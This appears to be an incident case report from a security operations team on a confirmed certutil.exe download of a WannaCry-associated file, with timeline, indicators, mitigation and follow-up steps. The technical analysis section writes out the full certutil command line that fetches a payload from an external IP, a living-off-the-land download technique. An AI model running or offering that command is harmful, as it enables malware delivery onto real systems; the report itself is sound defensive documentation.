# [CASE] Malicious certutil.exe Download from External IP

### Case ID (slug-friendly)

malware-2025-09-28

### Case Title

Malicious certutil.exe file download from external IP

### Executive summary

Detected malicious use of certutil.exe to download a payload from http://61.135.214.54/wncry.zip. This indicates possible malware delivery via a Living-off-the-Land binary. The activity was confirmed as True Positive.

### Timeline (key timestamps)

2025-09-28 10:03 — certutil.exe executed with -urlcache -split -f

2025-09-28 10:04 — connection to 61.135.214.54 established

2025-09-28 10:05 — file wncry.zip downloaded

### Artifacts / IOCs

certutil.exe was executed by a user or process without administrative purpose.

The command downloaded a file from a suspicious external IP (61.135.214.54).

Behavior matches LOLBAS technique for malicious file delivery.

No legitimate reason for certutil network access was observed.

Potential association with WannaCry-related payloads (wncry.zip).

### Technical analysis

URL: http://61.135.214.54/wncry.zip

IP: 61.135.214.54

Process: certutil.exe

Command line: certutil.exe -urlcache -split -f http://61.135.214.54/wncry.zip wncry.zip

### Actions taken / Mitigation

Host isolated from network

IOC (IP/URL) blocked on firewall and proxy

File quarantined and submitted for malware analysis

Event escalated for threat hunting

### Recommendations / Next steps

Perform IOC sweep across environment

Review all certutil.exe executions in last 7 days

Update SIEM detection for LOLBAS-based downloads

Conduct awareness session for users on suspicious tools

### Case owner

Ievgen Bondarenko
